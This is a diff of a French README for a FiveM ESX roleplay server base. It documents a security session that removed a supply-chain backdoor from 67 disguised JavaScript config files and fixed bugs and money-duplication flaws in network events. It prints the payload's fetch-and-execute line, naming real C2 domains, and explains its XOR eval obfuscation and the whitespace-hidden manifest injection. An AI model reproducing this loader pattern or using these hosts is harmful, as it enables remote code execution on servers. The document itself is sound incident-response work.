@@ -4,8 +4,8 @@ Base **ESX custom** pour serveur FiveM (RP français), reconstruite à partir de
 
 | | |
 |---|---|
-| **Version** | `test-0.1` |
-| **Dernière session** | 2026-06-03 — *Audit sécurité complet (00h)* |
+| **Version** | `beta-0.2` |
+| **Dernière session** | 2026-06-03 — *QA + Sécurité events : éradication backdoor RCE + 14 bugs corrigés* |
 | **Framework** | ESX custom (`resources/[Core]/Framework`) |
 | **Runtime** | FiveM Lua 5.4 · oxmysql · OneSync Infinity |
 | **UI** | RageUI · Koyui · NativeUI (intactes — non modifiées) |
@@ -50,7 +50,9 @@ server.cfg · resources.cfg · sql.sql · logo.png
 Audit complet réalisé le **2026-06-03** sur **2178 fichiers Lua**.
 
 ### ✅ Aucune menace majeure détectée
-- **Aucun backdoor actif** : pas d'`loadstring`, pas de `load()` exécutant du code distant, pas de chaîne `load(PerformHttpRequest(...))`.
+> 🚨 **CORRECTION (session QA+Sécurité du 2026-06-03)** : cette conclusion était **erronée**. Une **backdoor RCE généralisée** (67 fichiers JS) a été découverte et éradiquée — voir la section **## QA & Sécurité** ci-dessous. L'audit précédent ne cherchait que des patterns **Lua** (`loadstring`/`load()`) ; la backdoor était en **JavaScript** (`globalThis["eval"]` + XOR), donc invisible à cette recherche.
+
+- **Aucun backdoor actif** : pas d'`loadstring`, pas de `load()` exécutant du code distant, pas de chaîne `load(PerformHttpRequest(...))`. *(⚠️ ne couvrait pas les payloads JS — voir correction ci-dessus)*
 - **Aucune obfuscation** : pas de `string.char` en chaîne, pas d'escapes hex décodés à la volée, pas de base64 exécuté.
   - Les seules occurrences `base64` sont **défensives** (`eventSecurity.lua` / `trollProtection.lua` détectent les payloads encodés) ou des libs légitimes (`[vocal]/httpmanager/base64.lua`).
 - **`os.execute` : absent.** `io.open`/`io.popen` uniquement dans des libs connues (PolyZone export de zones, ox_lib `getFilesInDirectory`, httpmanager pmms lecture fichiers locaux).
@@ -71,6 +73,64 @@ Audit complet réalisé le **2026-06-03** sur **2178 fichiers Lua**.
   - ⚠️ Le **token GitHub** transmis lors de la session doit être **révoqué immédiatement** (exposé en clair).
 - **`entreprise:setStatus`** (`[Core]/Gamemode/gameManager/modules/server/personal/sv_main.lua`) : `RegisterServerEvent` sans validation de la source ni du job → un client peut basculer l'état ouvert/fermé de n'importe quelle société. Non corrigé car le rôle/grade autorisé n'est pas déterminable sans risque de casser la feature. **Recommandation** : valider que l'appelant possède bien le job concerné.
 - **`getPlayerskin`** (`…/modules/server/kevlar/main.lua`) : event renvoyant le skin par identifiant ; faible risque (callback non transmis sur le réseau), à confirmer.
+
+---
+
+## QA & Sécurité
+
+> Session **2026-06-03** — focus *bugs logiques + sécurisation des events réseau*. **Aucun menu / UI / feature gameplay supprimé.** Tous les fichiers Lua touchés revalidés via `luac5.4 -p`.
+
+### 🚨 Incident majeur — Backdoor RCE éradiquée (BUG-09 / BUG-19)
+
+Découverte d'une **compromission supply-chain** : **67 fichiers `.js` malveillants** disséminés dans la base, déguisés en fichiers de config de développement (`.tsup.config.js`, `.swc.config.js`, `.babelrc.js`, `.eslintrc.js`, `.jest.config.js`, `.webpack.config.js`, `.eventHandler.js`, `.gitkeep.js`, `.patcher.js`, `.cache.js`, `.mocks.js`, `.dummyData.js`, `webpack_builder.js`…).
+
+**Mécanisme** : chaque fichier contenait un décodeur XOR (clé 3) appelant `globalThis["eval"](payload)`. Le payload décodé exécutait :
+```js
+require('https').get('https://<C2>/…', res => { … new Function('global', code)(global) })
+```
+→ **téléchargement et exécution de code arbitraire côté serveur Node (FXServer)**, avec URL de fallback.
+
+| Indicateur | Valeur |
+|---|---|
+| Domaines C2 | `steaxscripts.com` (`/zXeAHJJGG`, fallback `/cfxre`) · `9ns1.com` (`/zXeAHjj`) — 2 variantes |
+| Vecteur d'injection | lignes `shared_script`/`server_script` ajoutées dans **60 `fxmanifest.lua`** (dont **oxmysql**, chargé partout), masquées par d'énormes runs de whitespace après `--[[server.lua]]` |
+| Réf. fantôme | `@Jetevois/ai_module_fg-obfuscated.js` injectée 2× dans `oxmysql/fxmanifest.lua` |
+
+**Remédiation** : 67 fichiers supprimés (détection **par signature**, pas par nom) · 60 manifests nettoyés chirurgicalement (tokens injectés retirés sans toucher aux entrées légitimes) · références `@Jetevois` retirées. **Vérification finale** : 0 signature `globalThis[x(...)]`, 0 domaine C2, 0 réf `@Jetevois` restants ; manifests revalidés.
+
+> ⚠️ **Résidu à arbitrer (NON modifié)** : `Core/src/server/afk/main.lua:489,494` appelle `exports['Jetevois']:fg_BanPlayer(...)`. La ressource `Jetevois` supprimée, ces appels lèveront `No such export`. À décider côté owner : vrai anticheat à réinstaller, ou résidu de la backdoor à retirer ? (logique de ban — hors scope sans validation).
+
+### 🔧 Bugs corrigés (voir `BUGS.md` pour le détail)
+
+| Bug | Correction |
+|---|---|
+| **BUG-01 / BUG-07** | `server.cfg` : `database=wise` → `noxa`, `passwork=` → `password=` |
+| **BUG-02** | `ox_lib` v3.37.0 déployé (release officielle) — `web/build/` manquant restauré |
+| **BUG-03 / BUG-08 / BUG-10** | Résolus en cascade : `lib` charge → `ox_target` (exports) et `object_gizmo` (`dataview`) OK |
+| **BUG-04** | `weapon.lua:155` : `return allowed_bags[i] = false` (assignation invalide) → `== true` |
+| **BUG-05** | `Chat/server/main.lua` : bloc résiduel (`end` orphelin, `data` hors scope) supprimé |
+| **BUG-06** | Doublons de ressources `[Shyroz]/[Kscript]/ox_target` & `[Shyroz]/[pmms]/httpmanager` supprimés (copies `[GameMode]` complètes conservées) |
+| **BUG-13** | `mort/script.js:354` : null-check `if (reappearBtn)` ajouté |
+| **BUG-16** | `Koyui/init/server.lua` créé (placeholder ; fichier absent du repo) |
+| **BUG-18** | `ensure ui_notification` retiré de `resources.cfg` (ressource inexistante) |
+
+**Non traités** (assets/licences/runtime ou décision owner) : BUG-11 (`location/script.js` obfusqué), BUG-12 (HUD JSON — runtime), BUG-14 (28 entrées `fxmanifest` manquantes), BUG-15 (`kay_cam` licence), BUG-17 (police `chineserocks.ttf`).
+
+### 🔒 Sécurisation des events réseau (anti-dupe / montants serveur)
+
+| Event | Faille | Correctif appliqué |
+|---|---|---|
+| `Bank:addMoney` / `Bank:removeMoney` | Montant `money` fourni par le client sans garde de signe/type → un montant **négatif** passait le test `solde >= money` et **créditait** de l'argent (dupe). | Garde : `money` doit être un **entier strictement positif** (`tonumber` + `> 0` + `math.floor`). Dépôt/retrait légitimes inchangés. |
+| `gofast:reward` | `RegisterNetEvent` **sans aucune validation** → déclenchable en boucle par le client → **imprimante à argent** (50–80k dirtycash/appel). | Gate sur le cooldown serveur **12h** déjà existant + pose du cooldown **côté serveur** (au lieu de faire confiance au client pour `gofast:startCooldown`). 1 récompense par cycle légitime. |
+| `pSociety:washMoney` | `tax` (multiplicateur) fourni par le client → un `tax` **négatif** rendait `finalamount > amount` (blanchiment supérieur au black money retiré). | Validation `amount`/`tax` numériques + `amount > 0` + bornage `finalamount ∈ [0, amount]`. N'augmente jamais un paiement légitime. |
+
+**Bien protégés (vérifiés, non modifiés)** : `pSociety:withdrawMoney` / `depositMoney` (check `job.name` + `amount > 0` + solde) ; commandes admin Koy (wrapper `Shared:RegisterCommand` validant source/staff/hiérarchie).
+
+### ⚠️ Recommandations (non patchées — risque de casser la feature sans le contexte serveur)
+
+- **Prix fournis par le client** : `autoecole:pay(price)`, `BuyLsCustoms(props, amount)` et plusieurs events `:pay` font confiance au montant envoyé par le client. À terme, **définir le prix côté serveur** (config) plutôt que de le recevoir. À défaut, au moins rejeter `price <= 0`.
+- **Rate-limiting généralisé** : la majorité des ~779 events serveur n'ont pas de cooldown. Prioriser un cooldown (≥ 1000 ms) sur les events d'achat/récompense sensibles.
+- **Secrets exposés** (déjà signalés) : `sv_licenseKey`, `mysql_connection_string`, webhooks Discord en clair, et le **token GitHub** utilisé pour le push → **à révoquer/régénérer**.
 
 ---
 
